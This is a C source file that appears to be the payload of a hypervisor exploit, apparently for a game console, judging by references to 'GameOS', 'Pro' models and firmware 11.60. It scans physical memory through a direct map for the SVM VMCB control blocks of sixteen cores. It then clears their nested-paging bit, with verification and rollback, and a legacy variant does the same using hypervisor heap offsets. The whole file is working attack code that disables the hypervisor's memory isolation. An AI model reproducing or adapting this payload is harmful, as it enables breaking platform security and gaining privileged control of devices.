#include <stdint.h>

#define VMCB_IOPM_BASE_PA  0x40
#define VMCB_MSRPM_BASE_PA 0x48
#define VMCB_ASID           0x58
#define VMCB_NESTED_CTRL    0x90
#define VMCB_NESTED_CR3     0xB0
#define VMCB_CLEAN          0xC0
#define VMCB_GUEST_CR3      0x550
#define VMCB_GUEST_RIP      0x578

#define AP_MODE_1160 0x313631312D504142ULL /* "BAP-1161" */
#define MARK_ENTERED 0x454E544552454431ULL /* "ENTERED1" */
#define MARK_DONE    0x444F4E452D415031ULL /* "DONE-AP1" */
#define MODE_STRIKE  0x31454B4952545356ULL /* "VSTRIKE1" */

#define REGULAR_SCAN_LO 0x062a00000ULL
#define REGULAR_SCAN_HI 0x063800000ULL
#define PRO_SCAN_LO     0x8e0a00000ULL
#define PRO_SCAN_HI     0x8e1800000ULL
#define PRO_REGION_LO   0x8e0000000ULL
#define PRO_REGION_HI   0x8e2000000ULL
#define TARGET_COUNT    16ULL

#define EXT_ERROR              0
#define EXT_SELF_PA            1
#define EXT_SELF_COUNT         2
#define EXT_TARGET_COUNT       3
#define EXT_SELF_NCR3          4
#define EXT_SELF_ASID          5
#define EXT_SELF_IOPM          6
#define EXT_SELF_MSRPM         7
#define EXT_WRITTEN            8
#define EXT_VERIFIED           9
#define EXT_CANDIDATES         10
#define EXT_ROLLBACK_WRITTEN   26
#define EXT_ROLLBACK_VERIFIED  27
#define EXT_HASH_BEFORE        28
#define EXT_HASH_REVALIDATED   29

#define FNV_OFFSET 0xcbf29ce484222325ULL
#define FNV_PRIME  0x100000001b3ULL

#define read64(p)           (*(volatile uint64_t *)(uintptr_t)(p))
#define read32(p)           (*(volatile uint32_t *)(uintptr_t)(p))
#define write64(p, v)       (*(volatile uint64_t *)(uintptr_t)(p) = (uint64_t)(v))
#define write32(p, v)       (*(volatile uint32_t *)(uintptr_t)(p) = (uint32_t)(v))

static __attribute__((noinline)) void vmcb_write64(uint64_t p, uint64_t v)
{
  write64(p, v);
}

static __attribute__((noinline)) void vmcb_write32(uint64_t p, uint32_t v)
{
  write32(p, v);
}

static __attribute__((noinline)) void vmcb_commit(uint64_t p, uint64_t nctl)
{
  vmcb_write64(p + VMCB_NESTED_CTRL, nctl);
  vmcb_write32(p + VMCB_CLEAN, 0);
  __asm__ volatile("" ::: "memory");
}

static int pointer_bounds(uint64_t scan_lo, uint64_t scan_hi,
                          uint64_t *region_lo, uint64_t *region_hi)
{
  if (scan_lo == REGULAR_SCAN_LO && scan_hi == REGULAR_SCAN_HI) {
    *region_lo = scan_lo;
    *region_hi = scan_hi;
    return 0;
  }
  if (scan_lo == PRO_SCAN_LO && scan_hi == PRO_SCAN_HI) {
    *region_lo = PRO_REGION_LO;
    *region_hi = PRO_REGION_HI;
    return 0;
  }
  return -1;
}

static int valid_scan_page(uint64_t pa, uint64_t lo, uint64_t hi)
{
  return (pa & 0xfffULL) == 0 && pa >= lo && pa < hi;
}

static int vmcb_matches(uint64_t p, uint64_t asid, uint64_t lo,
                        uint64_t hi, uint64_t nctl)
{
  uint64_t ncr3 = read64(p + VMCB_NESTED_CR3);
  uint64_t iopm = read64(p + VMCB_IOPM_BASE_PA);
  uint64_t msrpm = read64(p + VMCB_MSRPM_BASE_PA);

  return read64(p + VMCB_NESTED_CTRL) == nctl &&
         read32(p + VMCB_ASID) == asid &&
         valid_scan_page(ncr3, lo, hi) &&
         valid_scan_page(iopm, lo, hi) &&
         (lo != PRO_REGION_LO || valid_scan_page(msrpm, lo, hi));
}

static uint64_t hash_word(uint64_t hash, uint64_t value)
{
  for (int i = 0; i < 8; i++) {
    hash ^= (uint8_t)value;
    hash *= FNV_PRIME;
    value >>= 8;
  }
  return hash;
}

static uint64_t hash_candidate(uint64_t p, uint64_t pa, uint64_t hash)
{
  hash = hash_word(hash, pa);
  hash = hash_word(hash, read64(p + VMCB_NESTED_CTRL));
  return hash_word(hash, read32(p + VMCB_CLEAN));
}

static void rollback_candidates(uint64_t dmap, uint64_t asid,
                                uint64_t scan_lo, uint64_t scan_hi,
                                uint64_t region_lo, uint64_t region_hi,
                                const uint64_t candidates[TARGET_COUNT],
                                volatile uint64_t *ext, uint64_t written)
{
  uint64_t rollback_written = 0;
  uint64_t rollback_verified = 0;

  for (uint64_t i = 0; i < written; i++) {
    uint64_t pa = candidates[i];
    uint64_t p = dmap + pa;
    if (!valid_scan_page(pa, scan_lo, scan_hi) ||
        !vmcb_matches(p, asid, region_lo, region_hi, 8))
      continue;
    vmcb_commit(p, 9);
    rollback_written++;
  }
  for (uint64_t i = 0; i < written; i++) {
    uint64_t pa = candidates[i];
    uint64_t p = dmap + pa;
    if (valid_scan_page(pa, scan_lo, scan_hi) &&
        vmcb_matches(p, asid, region_lo, region_hi, 9) &&
        read32(p + VMCB_CLEAN) == 0)
      rollback_verified++;
  }
  ext[EXT_ROLLBACK_WRITTEN] = rollback_written;
  ext[EXT_ROLLBACK_VERIFIED] = rollback_verified;
}

/* 11.60's copied 13.x heap/pcpus globals are zero while the startup AP is
 * executing. Discover the current AP's VMCB from its injected CR3/RIP, use
 * its live ASID as the GameOS identity, and refuse all writes unless the scan
 * resolves to one self VMCB and exactly sixteen structurally valid targets. */
static void vmcb_disable_np_1160(uint64_t *param)
{
  const uint64_t dmap = param[1];
  const uint64_t scan_lo = param[3];
  const uint64_t scan_hi = param[8];
  const uint64_t needle_rip = param[5];
  const uint64_t needle_cr3 = param[6];
  volatile uint64_t *result = (volatile uint64_t *)(uintptr_t)param[2];
  volatile uint64_t *ext = (volatile uint64_t *)(uintptr_t)param[4];
  uint64_t self_pa = 0, self_count = 0;
  uint64_t region_lo = 0, region_hi = 0;
  uint64_t self_nctl = 0, self_ncr3 = 0, self_iopm = 0, self_msrpm = 0;
  uint64_t self_asid = 0;
  uint64_t candidates[TARGET_COUNT];
  uint64_t targets = 0, recorded = 0, self_selected = 0;
  uint64_t written = 0, verified = 0;
  uint64_t before = FNV_OFFSET, revalidated = FNV_OFFSET;
  uint64_t error = 0;

  result[0] = MARK_ENTERED;
  result[1] = MODE_STRIKE;
  ext[EXT_ROLLBACK_WRITTEN] = 0;
  ext[EXT_ROLLBACK_VERIFIED] = 0;

  if (pointer_bounds(scan_lo, scan_hi, &region_lo, &region_hi))
    error = 1;

  for (uint64_t pa = scan_lo; error == 0 && pa < scan_hi; pa += 0x1000) {
    uint64_t p = dmap + pa;
    if (read64(p + VMCB_GUEST_CR3) == needle_cr3 &&
        read64(p + VMCB_GUEST_RIP) == needle_rip) {
      if (self_count++ == 0) {
        self_pa = pa;
        self_nctl = read64(p + VMCB_NESTED_CTRL);
        self_ncr3 = read64(p + VMCB_NESTED_CR3);
        self_asid = read32(p + VMCB_ASID);
        self_iopm = read64(p + VMCB_IOPM_BASE_PA);
        self_msrpm = read64(p + VMCB_MSRPM_BASE_PA);
      }
    }
  }

  if (error == 0 && self_count != 1)
    error = 2;
  /* Keep the hardware-tested regular predicate: its MSRPM value was evidence,
   * not an acceptance condition. Pro hardware validation did validate MSRPM
   * against the complete 32 MiB aperture, rather than the narrower scan. */
  if (error == 0 &&
      (self_nctl != 9 || self_asid == 0 || self_asid >= 16 ||
       !valid_scan_page(self_ncr3, region_lo, region_hi) ||
       !valid_scan_page(self_iopm, region_lo, region_hi) ||
       (scan_lo == PRO_SCAN_LO &&
        !valid_scan_page(self_msrpm, region_lo, region_hi))))
    error = 3;

  if (error == 0) {
    for (uint64_t pa = scan_lo; pa < scan_hi; pa += 0x1000) {
      uint64_t p = dmap + pa;
      if (vmcb_matches(p, self_asid, region_lo, region_hi, 9)) {
        if (recorded < TARGET_COUNT) {
          candidates[recorded] = pa;
          ext[EXT_CANDIDATES + recorded++] = pa;
        }
        targets++;
        if (pa == self_pa)
          self_selected++;
        before = hash_candidate(p, pa, before);
      }
    }
    if (targets != TARGET_COUNT || recorded != TARGET_COUNT ||
        self_selected != 1)
      error = 4;
  }

  /* Revalidate the recorded dynamic set immediately before the first write.
   * The hash is compared only with this run's earlier scan; no console-specific
   * VMCB addresses or field hashes are accepted as authority. */
  if (error == 0) {
    for (uint64_t i = 0; i < TARGET_COUNT; i++) {
      uint64_t pa = candidates[i];
      uint64_t p = dmap + pa;
      if (!valid_scan_page(pa, scan_lo, scan_hi) ||
          !vmcb_matches(p, self_asid, region_lo, region_hi, 9)) {
        error = 5;
        break;
      }
      revalidated = hash_candidate(p, pa, revalidated);
    }
    if (error == 0 && before != revalidated)
      error = 5;
  }

  /* No hypervisor write is reachable until the complete sixteen-entry set
   * passes both scans. Each address is checked again at its write site. */
  if (error == 0) {
    for (uint64_t i = 0; i < TARGET_COUNT; i++) {
      uint64_t pa = candidates[i];
      uint64_t p = dmap + pa;
      if (!valid_scan_page(pa, scan_lo, scan_hi) ||
          !vmcb_matches(p, self_asid, region_lo, region_hi, 9)) {
        error = 6;
        break;
      }
      vmcb_commit(p, 8);
      written++;
    }
    for (uint64_t i = 0; error == 0 && i < written; i++) {
      uint64_t pa = candidates[i];
      uint64_t p = dmap + pa;
      if (valid_scan_page(pa, scan_lo, scan_hi) &&
          vmcb_matches(p, self_asid, region_lo, region_hi, 8) &&
          read32(p + VMCB_CLEAN) == 0)
        verified++;
    }
    if (error != 0 || written != TARGET_COUNT || verified != TARGET_COUNT) {
      if (error == 0)
        error = 6;
      rollback_candidates(dmap, self_asid, scan_lo, scan_hi,
                          region_lo, region_hi, candidates, ext, written);
    }
  }

  ext[EXT_ERROR] = error;
  ext[EXT_SELF_PA] = self_pa;
  ext[EXT_SELF_COUNT] = self_count;
  ext[EXT_TARGET_COUNT] = targets;
  ext[EXT_SELF_NCR3] = self_ncr3;
  ext[EXT_SELF_ASID] = self_asid;
  ext[EXT_SELF_IOPM] = self_iopm;
  ext[EXT_SELF_MSRPM] = self_msrpm;
  ext[EXT_WRITTEN] = written;
  ext[EXT_VERIFIED] = verified;
  ext[EXT_HASH_BEFORE] = before;
  ext[EXT_HASH_REVALIDATED] = revalidated;
  result[2] = self_pa;
  result[5] = error;
  result[6] = written;
  result[7] = verified;
  result[3] = MARK_DONE;
}

static void vmcb_disable_np_legacy(uint64_t *param)
{
  uint64_t dmap = param[1];
  uint64_t hv_heap_off = param[4];
  uint64_t pcpus = param[5];
  uint64_t heap;

  write64(param[2], 0xcafedead00001337ULL);
  heap = read64(dmap + hv_heap_off);

  for (int core = 0; core < 16; core++) {
    uint64_t pcpu = read64(dmap + pcpus + (uint64_t)core * sizeof(uint64_t));
    uint64_t vmcb, vpa, old;
    if (!pcpu)
      continue;
    vmcb = read64(dmap + (pcpu - heap) + 0xa8);
    if (!vmcb)
      continue;
    vpa = vmcb - heap;
    old = read64(dmap + vpa + VMCB_NESTED_CTRL);
    write64(dmap + vpa + VMCB_NESTED_CTRL, old & ~1ULL);
    write32(dmap + vpa + VMCB_CLEAN, 0);
  }
}

void vmcb_disable_np(uint64_t *param)
{
  if (param[7] == AP_MODE_1160)
    vmcb_disable_np_1160(param);
  else
    vmcb_disable_np_legacy(param);
}
